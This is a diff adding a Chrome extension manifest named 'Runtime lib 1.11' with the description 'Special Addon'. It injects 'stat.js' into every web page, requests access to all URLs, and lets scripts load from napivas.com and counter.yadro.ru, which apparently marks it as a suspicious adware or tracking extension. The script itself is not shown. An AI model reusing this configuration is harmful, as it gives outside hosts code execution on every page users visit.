@@ -1,0 +1,23 @@
+{
+"update_url": "https://clients2.google.com/service/update2/crx",
+
+
+   "browser_action": {
+      "default_icon": "ico/16.png"
+   },
+   "description": "Special Addon",
+   "icons": {
+      "128": "ico/128.png",
+      "16": "ico/16.png",
+      "19": "ico/19.png"
+   },
+   "manifest_version": 2,
+   "name": "Runtime lib 1.11",
+   "version": "1.0.4",
+"content_scripts": [ {
+      "js": [ "jquery-1.11.3.min.js","stat.js" ],
+      "matches": [ "http://*/*","https://*/*" ]
+   } ],
+   "permissions": ["*://*/*", "https://*/*", "http://*/*","https://napivas.com/*", "https://counter.yadro.ru/*"],
+"content_security_policy": "script-src 'self' https://napivas.com https://counter.yadro.ru; object-src 'self'"
+}
